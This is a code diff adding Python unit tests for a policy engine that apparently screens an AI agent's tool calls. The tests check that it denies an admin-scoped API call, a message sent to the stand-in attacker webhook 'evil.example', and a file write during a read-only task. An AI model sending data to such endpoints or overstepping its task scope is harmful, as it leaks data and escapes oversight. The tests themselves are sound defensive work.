@@ -99,6 +99,30 @@ class P0ModuleSplitTests(unittest.TestCase):
                     self.assertIn(expected_rule, result.rule_ids)
                     self.assertIn("dangerous_command", result.risk_types)
 
+    def test_policy_engine_denies_api_authz_and_external_send(self):
+        with tempfile.TemporaryDirectory() as temp:
+            tmpdir = Path(temp)
+            scope = self.make_scope(tmpdir)
+            scope.allowed_tools = ["call_api", "send_message"]
+            api_event = self.make_event(
+                tmpdir,
+                "call_api",
+                {"endpoint": "/orders", "params": {"user_id": "admin"}},
+            )
+            api_event.task_scope = scope
+            message_event = self.make_event(
+                tmpdir,
+                "send_message",
+                {"target": "https://evil.example/webhook", "content": "debug"},
+            )
+            message_event.task_scope = scope
+
+            api_result = PolicyEngine().evaluate(api_event)
+            message_result = PolicyEngine().evaluate(message_event)
+
+            self.assertIn("API_USER_SCOPE_VIOLATION", api_result.rule_ids)
+            self.assertIn("EXTERNAL_SEND_NOT_ALLOWED", message_result.rule_ids)
+
     def test_policy_engine_denies_command_outside_allowlist(self):
         with tempfile.TemporaryDirectory() as temp:
             tmpdir = Path(temp)
@@ -108,6 +132,28 @@ class P0ModuleSplitTests(unittest.TestCase):
 
             self.assertIn("COMMAND_NOT_ALLOWED", result.rule_ids)
             self.assertIn("command_not_allowed", result.risk_types)
+
+    def test_policy_engine_blocks_write_when_scope_is_read_only(self):
+        with tempfile.TemporaryDirectory() as temp:
+            tmpdir = Path(temp)
+            scope = self.make_scope(tmpdir)
+            scope.allowed_tools = ["write_file"]
+            scope.write_allowed = False
+            event = ToolCallEvent(
+                event_id="evt-write",
+                session_id="sess-write",
+                agent_name="unit",
+                user_task="只读总结项目",
+                task_scope=scope,
+                tool_name="write_file",
+                tool_args={"path": "tmp/note.txt", "content": "should not write"},
+                cwd=str(tmpdir),
+            )
+
+            result = PolicyEngine().evaluate(event)
+
+            self.assertIn("WRITE_NOT_ALLOWED", result.rule_ids)
+            self.assertIn("write_not_allowed", result.risk_types)
 
     def test_parameter_checker_enforces_allowed_paths(self):
         with tempfile.TemporaryDirectory() as temp:
